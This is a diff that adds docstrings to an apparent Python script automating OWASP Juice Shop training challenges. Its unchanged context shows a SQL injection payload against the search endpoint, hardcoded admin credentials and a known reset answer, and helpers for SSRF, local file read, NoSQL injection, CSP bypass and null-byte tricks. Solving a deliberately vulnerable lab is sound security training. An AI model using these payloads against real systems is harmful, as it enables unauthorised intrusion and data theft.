@@ -1,3 +1,5 @@
+"""Automation helpers to solve Juice Shop challenges for the day 296 booster."""
+
 import json
 import random
 import string
@@ -61,10 +63,12 @@ REDIRECT_URL = (
 
 
 def _random_string(length=8):
+    """Return a random alphanumeric string of the given length."""
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
 
 def _find_christmas_product(session):
+    """Locate the product ID for the Christmas item via SQL injection search."""
     payload = "')) OR 1=1 --"
     resp = session.get(
         f"{BASE_URL}/rest/products/search", params={"q": payload}, timeout=10
@@ -80,6 +84,7 @@ def _find_christmas_product(session):
 
 
 def fetch_challenges():
+    """Fetch the full challenge list from the Juice Shop API."""
     resp = requests.get(f"{BASE_URL}/api/Challenges", timeout=10)
     resp.raise_for_status()
     data = resp.json().get("data", [])
@@ -87,10 +92,12 @@ def fetch_challenges():
 
 
 def challenge_solved(challenges, key):
+    """Return True if the given challenge key is already marked solved."""
     return challenges.get(key, {}).get("solved", False)
 
 
 def register_user(email, password, username=None):
+    """Register a Juice Shop user and return the response."""
     payload = {
         "email": email,
         "password": password,
@@ -104,6 +111,7 @@ def register_user(email, password, username=None):
 
 
 def login(email, password):
+    """Authenticate a user and return the JWT token."""
     resp = requests.post(
         f"{BASE_URL}/rest/user/login",
         json={"email": email, "password": password},
@@ -118,6 +126,7 @@ def login(email, password):
 
 
 def solve_login_bjoern():
+    """Solve the login Bjoern challenge with the provided credentials."""
     return requests.post(
         f"{BASE_URL}/rest/user/login",
         json={
@@ -129,12 +138,14 @@ def solve_login_bjoern():
 
 
 def solve_complaint(message):
+    """Submit a complaint with the given message."""
     return requests.post(
         f"{BASE_URL}/api/Complaints", json={"message": message}, timeout=10
     )
 
 
 def solve_reset_bjoern_password():
+    """Reset Bjoern's password using the known security answer."""
     payload = {
         "email": "bjoern@juice-sh.op",
         "answer": "West-2082",
@@ -147,6 +158,7 @@ def solve_reset_bjoern_password():
 
 
 def solve_ssrf():
+    """Exploit the profile image URL SSRF issue."""
     token = login("admin@juice-sh.op", "admin123")
     headers = {
         "Cookie": f"token={token}",
@@ -160,6 +172,7 @@ def solve_ssrf():
 
 
 def solve_data_export():
+    """Trigger the data export for the admun user."""
     login_resp = requests.post(
         f"{BASE_URL}/rest/user/login",
         json={"email": "admun@juice-sh.op", "password": "admin123"},
@@ -189,18 +202,22 @@ def solve_data_export():
 
 
 def solve_privacy_policy():
+    """Fetch the privacy policy page."""
     return requests.get(PRIVACY_URL, timeout=10)
 
 
 def solve_easter_egg_l2():
+    """Reach the hidden second level Easter egg."""
     return requests.get(EASTER_EGG_L2_URL, timeout=10)
 
 
 def solve_premium_paywall():
+    """Bypass the premium paywall link."""
     return requests.get(PREMIUM_PAYWALL_URL, timeout=10)
 
 
 def solve_lfr():
+    """Exploit local file read via data erasure payload."""
     token = login("admin@juice-sh.op", "admin123")
     headers = {
         "Cookie": f"token={token}",
@@ -215,6 +232,7 @@ def solve_lfr():
 
 
 def solve_deprecated_interface():
+    """Upload XML to hit the deprecated interface endpoint."""
     token = login("admin@juice-sh.op", "admin123")
     headers = {"Authorization": f"Bearer {token}"}
     files = {"file": ("test.xml", "<test></test>", "application/xml")}
@@ -222,40 +240,49 @@ def solve_deprecated_interface():
 
 
 def solve_email_leak():
+    """Leak email via JSONP endpoint."""
     token = login("admin@juice-sh.op", "admin123")
     headers = {"Cookie": f"token={token}"}
     return requests.get(EMAIL_LEAK_URL, headers=headers, timeout=10)
 
 
 def solve_nosql_command():
+    """Trigger NoSQL command injection using sleep calls."""
     return requests.get(NOSQL_COMMAND_URL, timeout=10)
 
 
 def solve_forgotten_backup():
+    """Retrieve the forgotten coupon backup file."""
     return requests.get(FORGOTTEN_BACKUP_URL, timeout=10)
 
 
 def solve_forgotten_dev_backup():
+    """Retrieve the forgotten dev package backup file."""
     return requests.get(FORGOTTEN_DEV_BACKUP_URL, timeout=10)
 
 
 def solve_misplaced_signature():
+    """Access the misplaced signature YAML."""
     return requests.get(MISPLACED_SIGNATURE_URL, timeout=10)
 
 
 def solve_null_byte():
+    """Fetch the encrypted file using a null byte trick."""
     return requests.get(NULL_BYTE_URL, timeout=10)
 
 
 def solve_access_log():
+    """Download the access log for the current date."""
     return requests.get(ACCESS_LOG_URL, timeout=10)
 
 
 def solve_redirect():
+    """Test open redirect that points to GitHub via JS protocol."""
     return requests.get(REDIRECT_URL, timeout=10, allow_redirects=False)
 
 
 def solve_clock():
+    """Exploit coupon timing issue by creating a new user and checking out."""
     session = requests.Session()
     suffix = int(time.time() * 1000)
     email = f"clock_exploit_{suffix}@test.com"
@@ -309,10 +336,7 @@ def solve_clock():
 
 
 def prepare_csp_bypass():
-    """
-    Automates the CSP poisoning and payload placement. The actual alert trigger
-    (step 3) still requires loading the legacy profile page in a browser.
-    """
+    """Poison CSP via profile image URL and return the profile page response."""
     suffix = int(time.time() * 1000)
     email = f"csp_bypass_{suffix}@test.com"
     password = "Password123!"
@@ -333,6 +357,7 @@ def prepare_csp_bypass():
 
 
 def solve_christmas_special():
+    """Run the full Christmas Special flow end-to-end."""
     print("[christmas_special] Running end-to-end flow...")
     session = requests.Session()
 
@@ -458,6 +483,7 @@ def solve_christmas_special():
 
 
 def report_status(challenges, label):
+    """Print and return a solved-status summary keyed by challenge."""
     status = {
         "ssrf": challenge_solved(challenges, SSRF_CHALLENGE_KEY),
         "data_export": challenge_solved(challenges, DATA_EXPORT_KEY),
@@ -508,6 +534,7 @@ def report_status(challenges, label):
 
 
 def main():
+    """Execute the booster script to solve remaining challenges."""
     print("=== day296 booster v2.7 ===")
 
     initial = fetch_challenges()
